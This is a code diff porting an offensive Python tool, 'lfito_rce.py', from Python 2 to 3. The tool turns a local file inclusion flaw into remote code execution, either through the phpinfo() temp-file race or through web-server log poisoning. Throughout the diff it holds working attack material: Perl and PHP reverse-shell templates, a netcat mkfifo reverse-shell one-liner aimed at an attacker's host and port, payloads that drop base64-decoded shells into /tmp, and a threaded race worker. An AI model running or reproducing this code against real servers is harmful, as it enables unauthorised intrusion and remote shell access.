@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # -*- coding: utf8 -*-
 import requests
 from pprint import pprint
@@ -51,8 +51,8 @@ template='use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("
 template2="""<?php
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '%s';  
-$port = %s;       
+$ip = '%s';
+$port = %s;
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
@@ -66,7 +66,7 @@ if (function_exists('pcntl_fork')) {
     exit(1);
   }
   if ($pid) {
-    exit(0);  
+    exit(0);
   }
   if (posix_setsid() == -1) {
     printit("Error: Can't setsid()");
@@ -84,9 +84,9 @@ if (!$sock) {
   exit(1);
 }
 $descriptorspec = array(
-   0 => array("pipe", "r"),  
-   1 => array("pipe", "w"),  
-   2 => array("pipe", "w")   
+   0 => array("pipe", "r"),
+   1 => array("pipe", "w"),
+   2 => array("pipe", "w")
 );
 $process = proc_open($shell, $descriptorspec, $pipes);
 if (!is_resource($process)) {
@@ -139,7 +139,7 @@ function printit ($string) {
   }
 }
 ?>"""
-TAG="Security Test"    
+TAG="Security Test"
 http = urllib3.PoolManager()
 
 
@@ -168,34 +168,34 @@ Host: %s\r
 
 def debug(msg,VERBOSE):
  if (VERBOSE):
-   print colored('[DEBUG] '+msg, "blue")
+   print(colored('[DEBUG] '+msg, "blue"))
 
 def perror(msg):
-   print colored('[ERROR] '+msg, "red")
+   print(colored('[ERROR] '+msg, "red"))
 
 def phpInfoLFI(VERBOSE, LFI_PATH,  TAG, reqphp, http, host, port, offset):
-  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    
+  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   s.connect((host, port))
-  s.send(reqphp)
-  d = ""
+  s.send(bytes(reqphp, 'UTF-8'))
+  d = b""
   while len(d) < offset:
     d += s.recv(offset)
   try:
-    i = d.index("[tmp_name] =&gt")
+    i = d.index(b"[tmp_name] =&gt")
     fn = d[i+17:i+31]
   except ValueError:
     return None
-  try: 
-    d= requests.get(LFI_PATH % fn, verify=False,headers={'Connection':'close'},timeout=10).content   
+  try:
+    d= requests.get(LFI_PATH % fn, verify=False,headers={'Connection':'close'},timeout=10).content
   except requests.exceptions.ReadTimeout:
-    return fn  
+    return fn
   #d = http.request('GET', LFI_PATH % fn, timeout=5).data
   debug(d,VERBOSE)
-  if d.find(TAG) != -1:
+  if d.find(bytes(TAG, 'UTF-8')) != -1:
     debug("The rev shell output: "+d,VERBOSE)
     return fn
   else:
-    return None  
+    return None
 
 counter=0
 
@@ -219,13 +219,13 @@ class ThreadWorker(threading.Thread):
             try:
                 x = phpInfoLFI(*self.args)
                 if self.event.is_set():
-                    break                
+                    break
                 if x:
                     if self.payload_type == 3:
-                      print colored("\nGot it! Reverse php Shell created in %s" % self.revshell_name,'green')
+                      print(colored("\nGot it! Reverse php Shell created in %s" % self.revshell_name,'green'))
                     else:
-                      print colored("\nGot it! the payload  %s is executed in the remote host" % self.payload_type,"green")
-                    self.event.set() 
+                      print(colored("\nGot it! the payload  %s is executed in the remote host" % self.payload_type,"green"))
+                    self.event.set()
             except socket.error:
                 return
 def controll_log(args):
@@ -240,24 +240,24 @@ def controll_log(args):
       if requests.get(LFI_PATH).status_code in (404,403) :
         perror("LFI url path is not reachable !\n")
         sys.exit(1)
-    except requests.exceptions.MissingSchema, e:
+    except requests.exceptions.MissingSchema as e:
       perror("LFI url path is not reachable !\n")
       perror(str(e)+"\n")
       sys.exit(1)
-    except requests.exceptions.ConnectionError, e:
+    except requests.exceptions.ConnectionError as e:
       perror("LFI url path is not reachable !\n")
       perror(str(e)+"\n")
       sys.exit(1)
     # verify payload input
     if args.ptype <= 0 or args.ptype > 3 :
       perror("Payload parameter should be an integer value: 1 or 2 or 3 !\n")
-      sys.exit(1)      
+      sys.exit(1)
     ascii_banner = pyfiglet.figlet_format("R@()Gh1z tool")
     print("")
     print(ascii_banner)
-    print colored('Find all scripts in: https://github.com/roughiz\n\n', "green")  
-    print colored("LFI RCE via controlled log", "green")
-    print "-=" * 50+"\n"
+    print(colored('Find all scripts in: https://github.com/roughiz\n\n', "green"))
+    print(colored("LFI RCE via controlled log", "green"))
+    print("-=" * 50+"\n")
     # define the template to encode
     TEMPLATES ={}
     TEMPLATES[1]=template % (args.lhost,args.lport)
@@ -267,10 +267,10 @@ def controll_log(args):
 
     # define the end of lfi request
     if args.reqend != "":
-       args.reqend="%"+args.reqend  
+       args.reqend="%"+args.reqend
     # setup payloads and lfi and tag
     TAG="Security Test"
-    revshell_name='/tmp/'+''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(12)])+".php"
+    revshell_name='/tmp/'+''.join([random.choice(string.ascii_letters + string.digits) for n in range(12)])+".php"
     PAYLOAD1=""" %s <?php $file = fopen('/tmp/shell.pl', 'w'); fwrite($file,base64_decode('%s')); fclose($file); exec('`which perl` /tmp/shell.pl'); ?>""" % (TAG,base64revshell)
     PAYLOAD2=""" %s<?php exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f') ?>""" % (TAG,args.lhost,args.lport)
     PAYLOAD3=""" %s <?php $file = fopen('%s', 'w'); fwrite($file,base64_decode('%s')); fclose($file); ?>""" % (TAG,revshell_name,base64revshell)
@@ -311,7 +311,7 @@ def controll_log(args):
       except requests.exceptions.ConnectionError:
         found=True
         file_founded=file
-        continue  
+        continue
       debug("Response code: "+str(req.status_code),VERBOSE)
       debug("Response content: "+req.content,VERBOSE)
       d=req.content
@@ -320,20 +320,20 @@ def controll_log(args):
         file_founded=file
         break
     if found:
-      print colored("\n\nThe web server log file path is %s" % file_founded,'yellow')
+      print(colored("\n\nThe web server log file path is %s" % file_founded,'yellow'))
       if args.ptype == 3:
-        print colored("\nGot it! Reverse php Shell created in %s" % revshell_name,'green')
+        print(colored("\nGot it! Reverse php Shell created in %s" % revshell_name,'green'))
         url =LFI_PATH%revshell_name
-        print colored("\nI will execute the reverse shell, requesting the url: "+url,"yellow")
+        print(colored("\nI will execute the reverse shell, requesting the url: "+url,"yellow"))
         try:
           requests.get(url,verify=False,headers={'Connection':'close'},timeout=10)
         except requests.exceptions.ReadTimeout:
-          print colored("\nVerify your nc listenner %s:%s" % (args.lhost,args.lport),"yellow")
+          print(colored("\nVerify your nc listenner %s:%s" % (args.lhost,args.lport),"yellow"))
       else:
-        print colored("\nGot it! the payload  %s is executed in the remote host" % args.ptype,"green")
-        print colored("\nVerify your nc listenner %s:%s" % (args.lhost,args.lport),"yellow")
+        print(colored("\nGot it! the payload  %s is executed in the remote host" % args.ptype,"green"))
+        print(colored("\nVerify your nc listenner %s:%s" % (args.lhost,args.lport),"yellow"))
     else:
-      print colored("\n:( The RCE trough controlled Log File script failed !!","red")    
+      print(colored("\n:( The RCE trough controlled Log File script failed !!","red"))
 
 def main(args):
     args = args
@@ -348,24 +348,24 @@ def main(args):
       if requests.get(LFI_PATH).status_code in (404,403) or requests.get(PHPINFO_PATH).status_code in (404,403):
         perror("LFI url path or PHPINFO url path is not reachable !\n")
         sys.exit(1)
-    except requests.exceptions.MissingSchema, e:
+    except requests.exceptions.MissingSchema as e:
       perror("LFI url path or PHPINFO url path is not reachable !\n")
       perror(str(e)+"\n")
       sys.exit(1)
-    except requests.exceptions.ConnectionError, e:
+    except requests.exceptions.ConnectionError as e:
       perror("LFI url path or PHPINFO url path is not reachable !\n")
       perror(str(e)+"\n")
       sys.exit(1)
     # verify payload input
     if args.ptype <= 0 or args.ptype > 3 :
       perror("Payload parameter should be an integer value: 1 or 2 or 3 !\n")
-      sys.exit(1)      
+      sys.exit(1)
     ascii_banner = pyfiglet.figlet_format("R@()Gh1z tool")
     print("")
     print(ascii_banner)
-    print colored('Find all scripts in: https://github.com/roughiz\n\n', "green")  
-    print colored("LFI With PHPInfo() RCE script", "green")
-    print "-=" * 50+"\n"
+    print(colored('Find all scripts in: https://github.com/roughiz\n\n', "green"))
+    print(colored("LFI With PHPInfo() RCE script", "green"))
+    print("-=" * 50+"\n")
     poolsz=args.threads
 
     # define the template to encode
@@ -373,13 +373,14 @@ def main(args):
     TEMPLATES[1]=template % (args.lhost,args.lport)
     TEMPLATES[3]=template2 % (args.lhost,args.lport)
     TEMPLATES[2]=""
-    base64revshell=base64.b64encode(TEMPLATES[args.ptype])
+    #print(TEMPLATES)
+    base64revshell=base64.b64encode(bytes(TEMPLATES[args.ptype], 'UTF-8'))
 
     # define the end of lfi request
     if args.reqend != "":
-       args.reqend="%"+args.reqend  
+       args.reqend="%"+args.reqend
     # setup payloads and lfi and tag
-    revshell_name='/tmp/'+''.join([random.choice(string.ascii_letters + string.digits) for n in xrange(12)])+".php"
+    revshell_name='/tmp/'+''.join([random.choice(string.ascii_letters + string.digits) for n in range(12)])+".php"
     PAYLOAD1="""%s\r
 <?php $file = fopen("/tmp/shell.pl", "w"); fwrite($file,base64_decode("%s")); fclose($file); exec("`which perl` /tmp/shell.pl &"); ?>\r""" % (TAG,base64revshell)
     PAYLOAD2="""%s\r
@@ -392,7 +393,7 @@ def main(args):
     PAYLOADS[3]=PAYLOAD3
     PAYLOAD=PAYLOADS[args.ptype]
     LFI_PATH+="%s"+args.reqend
-    
+
     # phpinfo post params
     PADDING="A" * 5000
     COOKIES= {"PHPSESSID":"q249llvfromc1or39t6tvnun42;","othercookie":PADDING}
@@ -402,7 +403,7 @@ def main(args):
 
     debug("\nLFIrequest template : "+LFI_PATH,VERBOSE)
     response = requests.post(PHPINFO_PATH, files=files,headers=HEADERS, cookies=COOKIES)
-    i = response.content.find("[tmp_name] =&gt")
+    i = response.content.find(bytes("[tmp_name] =&gt", 'UTF-8'))
     if i == -1:
       raise ValueError("No php tmp_name in phpinfo output")
     debug("found %s at %i" % (response.content[i:i+10],i),VERBOSE)
@@ -417,14 +418,14 @@ def main(args):
     if ":" in host0:
       host=host0.split(":")[0]
       port=int(host0.split(":")[1])
-    phpinfo="/"+args.phpinfo.split("//")[1].split("/")[1]  
+    phpinfo="/"+args.phpinfo.split("//")[1].split("/")[1]
     reqphp= setup(host0,phpinfo,PAYLOAD,PADDING,TAG)
     debug(""+host0+" "+host+" "+str(port),VERBOSE)
     maxattempts = 1000
     e = threading.Event()
     l = threading.Lock()
 
-    print colored("Spawning worker pool (%d)..." % poolsz,"green")
+    print(colored("Spawning worker pool (%d)..." % poolsz,"green"))
     tp = []
     payload_type = args.ptype
     for i in range(0,poolsz):
@@ -441,25 +442,25 @@ def main(args):
                 sys.stdout.flush()
                 if counter >= maxattempts:
                     break
-        
+
         if e.is_set():
-            print colored("\nYep! The payload works great !","green")
+            print(colored("\nYep! The payload works great !","green"))
             if args.ptype == 3:
              url =LFI_PATH%revshell_name
-             print colored("\nI will execute the reverse shell, requesting the url: "+url,"yellow")
+             print(colored("\nI will execute the reverse shell, requesting the url: "+url,"yellow"))
              try:
                requests.get(url,verify=False,headers={'Connection':'close'},timeout=10)
              except requests.exceptions.ReadTimeout:
-               print colored("\nVerify your nc listenner %s:%s" % (args.lhost,args.lport),"yellow")
+               print(colored("\nVerify your nc listenner %s:%s" % (args.lhost,args.lport),"yellow"))
             else:
-              print colored("\nVerify your nc listenner %s:%s" % (args.lhost,args.lport),"yellow")
+              print(colored("\nVerify your nc listenner %s:%s" % (args.lhost,args.lport),"yellow"))
         else:
-            print colored(":(",'red')
+            print(colored(":(",'red'))
     except KeyboardInterrupt:
-        print "\nTelling threads to shutdown..."
+        print("\nTelling threads to shutdown...")
         e.set()
-    
-    print "Shuttin' down..."
+
+    print("Shuttin' down...")
     for t in tp:
         t.join()
 
@@ -480,14 +481,14 @@ if __name__=="__main__":
       if action.phpinfo is None:
         print("\nlfito_rce.py: error: argument -i/--phpinfo is required")
         sys.exit(1)
-      action=True  
+      action=True
     elif action.action and action.action == "2":
       action=False
     else:
-      arg_parser.error("\nAction should be: 1 for 'PHPINFO' or 2 for 'controlled log'")  
-    args = arg_parser.parse_args()  
-    
+      arg_parser.error("\nAction should be: 1 for 'PHPINFO' or 2 for 'controlled log'")
+    args = arg_parser.parse_args()
+
     if action:
       main(args)
     else:
-      controll_log(args)  
+      controll_log(args)
